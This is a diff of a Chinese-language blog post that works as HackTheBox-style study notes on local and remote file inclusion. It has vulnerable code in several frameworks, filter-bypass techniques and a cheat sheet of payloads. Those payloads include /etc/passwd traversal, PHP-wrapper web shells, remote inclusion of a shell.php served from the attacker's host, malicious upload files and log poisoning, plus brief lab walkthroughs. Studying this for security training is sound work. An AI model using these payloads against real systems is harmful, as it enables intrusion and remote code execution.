@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salve || file inclusion</title>
+    <title>Salve || File inclusion:File Disclosure</title>
     <meta name="author" content="TiAmo">
     <meta name="description" content="Buona notte ">
     <meta name="keywords" content=" ">
@@ -169,7 +169,7 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>file inclusion </h1>
+        <h1>File inclusion:File Disclosure </h1>
     </div>
     <div class="info">
         <span class="date">
@@ -195,13 +195,542 @@
                 </a>
             </span>
             
+            <span class="tag">
+                
+                <a href="/tags/practice" style=color:#03a9f4>
+                    practice
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/hackthebox" style=color:#03a9f4>
+                    hackthebox
+                </a>
+            </span>
+            
         </span>
         
     </div>
 
     <div class="content" v-pre>
-        <p>​	让我们看一些易受文件包含攻击的代码示例，以了解此类漏洞是如何发生的。如前所述，文件包含漏洞可能出现在许多最流行的web服务器和开发框架中，如PHP、NodeJS、Java、.Net等。它们中的每一个都有一种稍微不同的方法来包含本地文件，但它们都有一个共同点：从指定的路径加载文件。<br>这样的文件可以是动态头或基于用户指定语言的不同内容。例如，页面可能有一个？language GET参数，如果用户从下拉菜单中更改语言，则会返回相同的页面，但使用不同的语言参数（例如？language&#x3D;es）。在这种情况下，更改语言可能会更改web应用程序加载页面的目录（例如&#x2F;en&#x2F;或&#x2F;es&#x2F;）。如果我们能够控制正在加载的路径，那么我们可能能够利用此漏洞读取其他文件，并可能实现远程代码执行。</p>
+        <h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>让我们看一些易受文件包含攻击的代码示例，以了解此类漏洞是如何发生的。如前所述，文件包含漏洞可能出现在许多最流行的web服务器和开发框架中，如PHP、NodeJS、Java、.Net等。它们中的每一个都有一种稍微不同的方法来包含本地文件，但它们都有一个共同点：从指定的路径加载文件。<br>这样的文件可以是动态头或基于用户指定语言的不同内容。例如，页面可能有一个？language GET参数，如果用户从下拉菜单中更改语言，则会返回相同的页面，但使用不同的语言参数（例如？language&#x3D;es）。在这种情况下，更改语言可能会更改web应用程序加载页面的目录（例如&#x2F;en&#x2F;或&#x2F;es&#x2F;）。如果我们能够控制正在加载的路径，那么我们可能能够利用此漏洞读取其他文件，并可能实现远程代码执行。</p>
 <span id="more"></span>
+
+<p>在PHP中，我们可以在加载页面时使用include（）函数来加载本地或远程文件。如果传递到include（）的路径取自用户控制的参数（如GET参数），并且代码没有显式过滤和净化用户输入，那么代码就容易受到文件包含的攻击。以下代码片段显示了一个示例：</p>
+<pre><code>if (isset($_GET[&#39;language&#39;])) &#123;
+    include($_GET[&#39;language&#39;]);
+&#125;
+</code></pre>
+<p>我们看到语言参数被直接传递给include（）函数。因此，我们在语言参数中传递的任何路径都将加载到页面上，包括后端服务器上的任何本地文件。这并不是include（）函数独有的，因为如果我们能够控制传入它们的路径，许多其他PHP函数也会导致同样的漏洞。这样的函数包括includeonce（）、require（）、Requireonce（（）、file_get_contents（）和其他一些函数。</p>
+<p>就像PHP的情况一样，NodeJS web服务器也可以基于HTTP参数加载内容。以下是如何使用GET参数语言控制将哪些数据写入页面的基本示例：</p>
+<pre><code>if(req.query.language) &#123;
+    fs.readFile(path.join(__dirname, req.query.language), function (err, data) &#123;
+        res.write(data);
+    &#125;);
+&#125;
+</code></pre>
+<p>正如我们所看到的，从URL传递的任何参数都会被readfile函数使用，然后它会在HTTP响应中写入文件内容。另一个例子是Express.js框架中的render（）函数。下面的示例显示使用语言参数来确定应该从哪个目录中提取about.html页面：</p>
+<pre><code>app.get(&quot;/about/:language&quot;, function(req, res) &#123;
+    res.render(`/$&#123;req.params.language&#125;/about.html`);
+&#125;);
+</code></pre>
+<p>同样的概念也适用于许多其他web服务器。以下示例显示了Java web服务器的web应用程序如何使用include函数基于指定参数包含本地文件：</p>
+<pre><code>&lt;c:if test=&quot;$&#123;not empty param.language&#125;&quot;&gt;
+    &lt;jsp:include file=&quot;&lt;%= request.getParameter(&#39;language&#39;) %&gt;&quot; /&gt;
+&lt;/c:if&gt;
+</code></pre>
+<p>include函数可以将文件或页面URL作为其参数，然后将对象渲染到前端模板中，类似于我们之前在NodeJS中看到的模板。导入函数也可以用于呈现本地文件或URL，例如以下示例：</p>
+<pre><code>&lt;c:import url= &quot;&lt;%= request.getParameter(&#39;language&#39;) %&gt;&quot;/&gt;
+</code></pre>
+<p>最后，让我们以.NET web应用程序中可能出现的文件包含漏洞为例。Response.WriteFile函数的工作原理与我们前面的所有示例非常相似，因为它为其输入获取文件路径，并将其内容写入响应。该路径可以从用于动态内容加载的GET参数中检索，如下所示：</p>
+<pre><code>@if (!string.IsNullOrEmpty(HttpContext.Request.Query[&#39;language&#39;])) &#123;
+    &lt;% Response.WriteFile(&quot;&lt;% HttpContext.Request.Query[&#39;language&#39;] %&gt;&quot;); %&gt; 
+&#125;
+</code></pre>
+<p>此外，@Html.Partial（）函数也可以用于将指定的文件作为前端模板的一部分进行渲染，类似于我们前面看到的：</p>
+<pre><code>@Html.Partial(HttpContext.Request.Query[&#39;language&#39;])
+</code></pre>
+<p>最后，include函数可以用于呈现本地文件或远程URL，也可以执行指定的文件：</p>
+<pre><code>&lt;!--#include file=&quot;&lt;% HttpContext.Request.Query[&#39;language&#39;] %&gt;&quot;--&gt;
+</code></pre>
+<p>从以上所有示例中，我们可以看到，任何web服务器和任何开发框架中都可能出现文件包含漏洞，因为所有这些漏洞都提供了加载动态内容和处理前端模板的功能。<br>需要记住的最重要的一点是，上面的一些函数只读取指定文件的内容，而其他函数也执行指定文件。此外，其中一些允许指定远程URL，而另一些仅使用后端服务器本地的文件。<br>下表显示了哪些函数可以执行文件，哪些函数只读取文件内容：</p>
+<table>
+<thead>
+<tr>
+<th><strong>Function</strong></th>
+<th><strong>Read Content</strong></th>
+<th><strong>Execute</strong></th>
+<th><strong>Remote URL</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PHP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include()</code>&#x2F;<code>include_once()</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>require()</code>&#x2F;<code>require_once()</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>fopen()</code>&#x2F;<code>file()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td>✅</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+</tbody></table>
+<h1 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h1><p>我们通过指定文件的绝对路径（例如<code>/etc/passwd</code>）来读取文件。如果在<code>include（）</code>函数中使用整个输入而不添加任何内容，这将起作用，如以下示例：</p>
+<pre><code>include($_GET[&#39;language&#39;]);
+</code></pre>
+<p>在这种情况下，如果我们尝试读取<code>/etc/passwd</code>，那么<code>include（）</code>函数将直接获取该文件。然而，在许多情况下，web开发人员可能会在语言参数后附加或预加一个字符串。例如，语言参数可以用于文件名，并且可以添加在目录之后，如下所示：</p>
+<pre><code>include(&quot;./languages/&quot; . $_GET[&#39;language&#39;]);
+</code></pre>
+<p>在这种情况下，如果我们试图读取<code>/etc/passwd</code>，那么传递给<code>include（）</code>的路径将是<code>（./languages//etc/passwd）</code>，由于此文件不存在，我们将无法读取任何内容：</p>
+<p>我们可以通过使用相对路径遍历目录来轻松绕过此限制。为此，我们可以添加<code>../</code>在我们的文件名之前，它指的是父目录。例如，如果languages目录的完整路径是<code>/var/www/html/languages/</code>，则使用<code>/index.php</code>将引用父目录上的index.php文件（即<code>/var/www/html/index.php</code>）。</p>
+<p>因此，我们可以使用这个技巧返回几个目录，直到到达根路径（即<code>/</code>），然后指定我们的绝对文件路径（例如<code>../../../etc/passwd</code>），并且文件应该存在：</p>
+<p>它应该在这两种情况下都能起作用。此外，如果我们在根路径（<code>/</code>）并使用..&#x2F;那么我们仍然会停留在根路径上。因此，如果我们不确定web应用程序所在的目录，我们可以添加<code>../</code>很多次</p>
+<h1 id="文件名前缀"><a href="#文件名前缀" class="headerlink" title="文件名前缀"></a>文件名前缀</h1><p>在前面的例子中，我们在目录后面使用了language参数，这样我们就可以遍历路径来读取passwd文件。在某些情况下，我们的输入可能会附加在不同的字符串之后。例如，它可以与前缀一起使用以获得完整的文件名，如以下示例：</p>
+<pre><code>include(&quot;lang_&quot; . $_GET[&#39;language&#39;]);
+</code></pre>
+<p>在这种情况下，如果我们尝试使用<code>../../..</code>遍历目录<code>/etc/passwd</code>，最后一个字符串将是<code>lang../..//etc/passwd</code>，无效</p>
+<p>我们可以在有效载荷之前加上前缀<code>/</code>，而不是直接使用路径遍历，这应该将前缀视为目录，然后我们应该绕过文件名，能够遍历目录：</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/../../../etc/passwd</code></p>
+<pre><code>注意：这可能并不总是有效的，因为在这个例子中，名为lang_/的目录可能不存在，所以我们的相对路径可能不正确。此外，任何附加到我们输入的前缀都可能破坏我们将在下一节中讨论的一些文件包含技术，例如使用PHP包装器和过滤器或RFI。
+</code></pre>
+<h1 id="文件名后缀"><a href="#文件名后缀" class="headerlink" title="文件名后缀"></a>文件名后缀</h1><p>另一个非常常见的例子是将扩展附加到语言参数，如下所示：</p>
+<pre><code>include($_GET[&#39;language&#39;] . &quot;.php&quot;);
+</code></pre>
+<p>这很常见，因为在这种情况下，我们不必每次需要更改语言时都编写扩展。这也可能更安全，因为它可能会限制我们只包括PHP文件。在这种情况下，如果我们尝试读取&#x2F;etc&#x2F;passwd，那么包含的文件将是&#x2F;etc&#x2F;passwd.php，但该文件不存在，我们可以使用几种技术来绕过这一点，我们将在接下来的章节中讨论它们。</p>
+<h1 id="二阶攻击"><a href="#二阶攻击" class="headerlink" title="二阶攻击"></a>二阶攻击</h1><p>正如我们所看到的，LFI攻击可以有不同的形式。另一种常见的、更高级的LFI攻击是二阶攻击。这是因为许多web应用程序功能可能基于用户控制的参数从后端服务器不安全地提取文件。<br>例如，网络应用程序可能允许我们通过类似（&#x2F;profile&#x2F;$username&#x2F;avator.png）的URL下载我们的头像。如果我们伪造了一个恶意的LFI用户名（例如..&#x2F;..&#x2F;etc&#x2F;passwd），那么就有可能将被拉入的文件更改为服务器上的另一个本地文件，并将其获取，而不是我们的头像。<br>在这种情况下，我们将使用用户名中的恶意LFI负载毒害数据库条目。然后，另一个网络应用程序功能将利用这个中毒的条目来执行我们的攻击（即根据用户名值下载我们的头像）。这就是为什么这种攻击被称为二阶攻击。<br>开发人员经常忽略这些漏洞，因为他们可能会保护自己不受直接用户输入（例如，页面参数）的影响，但他们可能会信任从数据库中提取的值，比如本例中的用户名。如果我们在注册期间设法毒害了我们的用户名，那么攻击就有可能发生。<br>使用二阶攻击利用LFI漏洞与我们在本节中讨论的内容类似。唯一的差异是，我们需要发现一个函数，该函数根据我们间接控制的值提取文件，然后尝试控制该值以利用该漏洞。</p>
+<h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>基本</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/etc/passwd</code></td>
+<td>基本低频</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd</code></td>
+<td>具有路径遍历的 LFI</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/../../../etc/passwd</code></td>
+<td>具有名称前缀的 LFI</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./languages/../../../../etc/passwd</code></td>
+<td>具有已批准路径的 LFI</td>
+</tr>
+<tr>
+<td><strong>LFI 旁路</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=....//....//....//....//etc/passwd</code></td>
+<td>绕过基本路径遍历筛选器</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code></td>
+<td>绕过使用 URL 编码的筛选器</td>
+</tr>
+<tr>
+<td><code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code></td>
+<td>绕过带有路径截断的附加扩展（已过时）</td>
+</tr>
+<tr>
+<td><code>/index.php?language=../../../../etc/passwd%00</code></td>
+<td>绕过带有空字节的附加扩展（已过时）</td>
+</tr>
+<tr>
+<td><code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code></td>
+<td>使用 base64 过滤器读取 PHP</td>
+</tr>
+</tbody></table>
+<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PHP 包装器</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></td>
+<td>带数据包装器的 RCE</td>
+</tr>
+<tr>
+<td><code>curl -s -X POST --data &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot;</code></td>
+<td>带输入包装器的 RCE</td>
+</tr>
+<tr>
+<td><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</code></td>
+<td>带有预期包装器的 RCE</td>
+</tr>
+<tr>
+<td><strong>射频 干扰</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code></td>
+<td>主机网络外壳</td>
+</tr>
+<tr>
+<td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>包括远程 PHP 网页外壳</td>
+</tr>
+<tr>
+<td><strong>LFI + 上传</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo &#39;GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.gif</code></td>
+<td>创建恶意映像</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>带有恶意上传图像的 RCE</td>
+</tr>
+<tr>
+<td><code>echo &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>创建恶意 zip 存档“作为 jpg”</td>
+</tr>
+<tr>
+<td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>带有恶意上传的 zip 的 RCE</td>
+</tr>
+<tr>
+<td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>创建恶意 phar “作为 jpg”</td>
+</tr>
+<tr>
+<td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>带有恶意上传的 phar 的 RCE</td>
+</tr>
+<tr>
+<td><strong>日志中毒</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>读取 PHP 会话参数</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>使用 Web shell 毒害 PHP 会话</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE 通过中毒的 PHP 会话</td>
+</tr>
+<tr>
+<td><code>curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -A &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code></td>
+<td>中毒服务器日志</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE 通过中毒的 PHP 会话</td>
+</tr>
+</tbody></table>
+<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287</code></td>
+<td>模糊页面参数</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287</code></td>
+<td>模糊 LFI 有效载荷</td>
+</tr>
+<tr>
+<td><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287</code></td>
+<td>模糊网络根路径</td>
+</tr>
+<tr>
+<td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287</code></td>
+<td>模糊服务器配置</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI词表</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-贾迪克斯.txt</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">适用于 Linux 的 Webroot 路径单词列表</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">适用于 Windows 的 Webroot 路径单词列表</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">适用于 Linux 的服务器配置词表</a></td>
+<td></td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">适用于 Windows 的服务器配置词表</a></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h1><pre><code>target:139.59.185.174:31300
+使用文件包含在系统中查找以“b”开头的用户的名称。
+提交位于/usr/share/flags目录中的flag.txt文件的内容。
+</code></pre>
+<p>先打开网站：</p>
+<p><img src="/img/File_inclusion_1.png" alt="1"></p>
+<p>看看切换语言的效果：</p>
+<p><img src="/img/File_inclusion_2.png" alt="2"></p>
+<p>发先url里面有文件包含，直接向前遍历<code>../../../../etc/passwd</code></p>
+<p><img src="/img/File_inclusion_3.png" alt="1"></p>
+<p>第二题就不用多说了。</p>
+<h1 id="Basic-Bypasses"><a href="#Basic-Bypasses" class="headerlink" title="Basic Bypasses"></a>Basic Bypasses</h1><h2 id="非递归路径遍历过滤器"><a href="#非递归路径遍历过滤器" class="headerlink" title="非递归路径遍历过滤器"></a>非递归路径遍历过滤器</h2><p>针对LFI的最基本的过滤器之一是搜索和替换过滤器，它只删除（..&#x2F;）的子字符串以避免路径遍历。例如：</p>
+<pre><code>$language = str_replace(&#39;../&#39;, &#39;&#39;, $_GET[&#39;language&#39;]);
+</code></pre>
+<p>这个过滤器是非常不安全的，因为它不是递归地删除..&#x2F;子字符串，因为它在输入字符串上运行一次，而不在输出字符串上应用筛选器。</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=....//....//....//....//etc/passwd</code></p>
+<p><code>….//</code>子字符串并不是我们可以使用的唯一旁路，因为我们可以使用<code>…/./</code>或<code>....\/</code>以及若干其它递归LFI有效载荷。此外，在某些情况下，转义正斜杠字符也可以避免路径遍历过滤器（例如….&#x2F;）或添加额外的正斜杠（例如…..&#x2F;&#x2F;&#x2F;）</p>
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>一些网络过滤器可能会阻止包含某些LFI相关字符（如点）的输入过滤器。或斜线&#x2F;用于路径遍历。然而，对我们的输入进行URL编码可能会绕过其中一些过滤器，这样它就不再包括这些坏字符，但一旦到达易受攻击的函数，仍然会被解码回我们的路径遍历字符串。5.3.4及更早版本上的核心PHP过滤器特别容易受到这种绕过的影响，但即使在较新版本上，我们也可能发现可以通过URL编码绕过的自定义过滤器。<br>如果目标web应用程序不允许。和&#x2F;在我们的输入中，我们可以URL编码..&#x2F;进入%2e%2e%2f，这可能会绕过过滤器。</p>
+<h2 id="Approved-Paths"><a href="#Approved-Paths" class="headerlink" title="Approved Paths"></a>Approved Paths</h2><p>一些web应用程序还可以使用正则表达式来确保所包含的文件位于特定路径下。例如，我们一直在处理的web应用程序可能只接受下面的路径&#x2F;languages目录，如下所示：</p>
+<pre><code>if(preg_match(&#39;/^\.\/languages\/.+$/&#39;, $_GET[&#39;language&#39;])) &#123;
+    include($_GET[&#39;language&#39;]);
+&#125; else &#123;
+    echo &#39;Illegal path specified!&#39;;
+&#125;
+</code></pre>
+<p>要找到批准的路径，我们可以检查现有表单发送的请求，并查看它们用于正常web功能的路径。此外，我们可以模糊相同路径下的web目录，并尝试不同的目录，直到我们得到匹配。为了绕过这一点，我们可以使用路径遍历，并使用批准的路径启动有效负载，然后使用..&#x2F;返回根目录并读取我们指定的文件，如下所示：</p>
+<p><code>&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd</code></p>
+<h2 id="附加扩展名"><a href="#附加扩展名" class="headerlink" title="附加扩展名"></a>附加扩展名</h2><p>如前一节所述，一些web应用程序在我们的输入字符串（例如.php）中附加了一个扩展名，以确保我们包含的文件是预期的扩展名。对于现代版本的PHP，我们可能无法绕过这一点，并且将被限制为仅读取该扩展名中的文件，这可能仍然很有用，正如我们将在下一节中看到的那样（例如，用于读取源代码）。<br>我们可以使用其他一些技术，但它们在现代版本的PHP中已经过时，只能用于5.3&#x2F;5.4之前的PHP版本。然而，提到它们可能仍然是有益的，因为一些web应用程序可能仍然运行在较旧的服务器上，而这些技术可能是唯一可能的绕过方法。</p>
+<h3 id="路径截断"><a href="#路径截断" class="headerlink" title="路径截断"></a>路径截断</h3><p>在早期版本的PHP中，定义的字符串的最大长度为4096个字符，这可能是由于32位系统的限制。如果传递一个较长的字符串，它将被截断，并且超过最大长度的任何字符都将被忽略。此外，PHP还用于删除路径名中的尾随斜杠和单点，因此如果我们调用（<code>/etc/passwd/.</code>），则使用&#x2F;。也将被截断，PHP将调用（<code>/etc/passwd</code>）。PHP和Linux系统通常也会忽略路径中的多个斜杠（例如<code>///etc/passwd</code>与<code>/etc/passwd</code>相同）。类似地，路径中间的当前目录快捷方式（<code>.</code>）也将被忽略（例如<code>/etc/./passwd</code>）。</p>
+<p>这种有效载荷的一个例子如下：</p>
+<pre><code>?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
+</code></pre>
+<p>当然，我们不必手动键入。&#x2F;2048次（总共4096个字符），但我们可以使用以下命令自动创建此字符串：</p>
+<pre><code>echo -n &quot;non_existing_directory/../../../etc/passwd/&quot; &amp;&amp; for i in &#123;1..2048&#125;; do echo -n &quot;./&quot;; done
+non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././
+</code></pre>
+<h3 id="Null字节"><a href="#Null字节" class="headerlink" title="Null字节"></a>Null字节</h3><p>5.5之前的PHP版本容易受到空字节注入的攻击，这意味着在字符串末尾添加一个空字节（%00）会终止字符串，而不会考虑后面的任何内容。这是由于字符串在低级别内存中的存储方式，内存中的字符串必须使用空字节来指示字符串的末尾，如Assembly、C或C++语言中所示。<br>要利用此漏洞，我们可以用一个空字节（例如&#x2F;etc&#x2F;passwd%00）来结束负载，这样传递给include（）的最终路径将是（&#x2F;etc&#x2F;passwd&#x2F;00.php）。这样，即使php被附加到我们的字符串中，空字节之后的任何内容都会被截断，因此使用的路径实际上是&#x2F;etc&#x2F;passwd，从而使我们绕过附加的扩展。</p>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><pre><code>target:159.65.60.16:31498
+上述web应用程序采用了多个过滤器来避免LFI被利用。尝试绕过这些筛选器来读取/flag.txt
+</code></pre>
+<p><img src="/img/File_inclusion_4.png" alt="1"></p>
+<p>应该就加了一个标准路径language和非递归过滤器</p>
+<h1 id="PHP过滤器-PHP-Filters"><a href="#PHP过滤器-PHP-Filters" class="headerlink" title="PHP过滤器-PHP Filters"></a>PHP过滤器-<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.php">PHP Filters</a></h1><p>许多流行的web应用程序都是用PHP开发的，还有使用不同PHP框架构建的各种自定义web应用程序，如Laravel或Symfony。如果我们在PHP web应用程序中发现LFI漏洞，那么我们可以利用不同的PHP包装来扩展我们的LFI攻击，甚至可能达到远程代码执行。<br>PHP包装器允许我们在应用程序级别访问不同的I&#x2F;O流，如标准输入&#x2F;输出、文件描述符和内存流。这对PHP开发人员有很多用处。尽管如此，作为网络渗透测试人员，我们可以利用这些包装来扩展我们的利用攻击，并能够读取PHP源代码文件，甚至执行系统命令。这不仅有利于LFI攻击，也有利于其他网络攻击，如XXE，如网络攻击模块所述。<br>在本节中，我们将了解如何使用基本的PHP过滤器来读取PHP源代码，在下一节中，将了解不同的PHP包装器如何帮助我们通过LFI漏洞获得远程代码执行。</p>
+<h2 id="Input-Filters"><a href="#Input-Filters" class="headerlink" title="Input Filters"></a>Input Filters</h2><p>PHP过滤器是一种PHP包装器，在这里我们可以传递不同类型的输入，并由我们指定的过滤器进行过滤。要使用PHP包装流，我们可以在字符串中使用<code>PHP://</code>方案，并且我们可以使用<code>php://filter/.</code><br>过滤器包装器有几个参数，但我们攻击所需的主要参数是<code>resource</code>和<code>read</code>。过滤器包装器需要<code>resource</code>参数，使用它我们可以指定要对其应用过滤器的流（例如本地文件），而<code>read</code>参数可以对输入资源应用不同的过滤器，因此我们可以使用它来指定要对资源应用哪个过滤器。</p>
+<p>有四种不同类型的过滤器可供使用， <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.string.php">String Filters</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. 可以在各自的链接上阅读更多关于每个过滤器的信息，但对LFI攻击有用的过滤器是Conversion Filters下的convert.base64-encode过滤器。</p>
+<h2 id="Fuzzing-for-PHP-Files"><a href="#Fuzzing-for-PHP-Files" class="headerlink" title="Fuzzing for PHP Files"></a>Fuzzing for PHP Files</h2><p>第一步是使用ffuf或gobuster等工具对不同的可用PHP页面进行模糊处理，与正常的web应用程序使用不同，我们不限于HTTP响应代码为200的页面，因为我们有本地文件包含访问权限，所以我们应该扫描所有代码，包括“301”、“302”和“403”页面，我们也应该能够读取它们的源代码。</p>
